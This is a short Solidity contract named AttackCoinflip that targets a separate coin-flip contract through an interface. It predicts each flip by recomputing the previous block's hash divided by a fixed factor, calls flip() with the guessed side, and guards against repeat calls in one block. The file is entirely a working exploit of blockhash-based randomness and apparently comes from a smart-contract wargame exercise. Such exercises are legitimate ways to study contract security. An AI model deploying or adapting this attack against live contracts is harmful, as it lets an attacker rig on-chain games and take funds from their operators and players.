// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

interface targetInterface{
    function flip(bool _guess) external;
}

contract AttackCoinflip {
  targetInterface Coinflip;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victim) public {
    Coinflip = targetInterface(_victim);
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 result = blockValue / FACTOR;
    bool side = result == 1 ? true : false;
    Coinflip.flip(side);
  }
}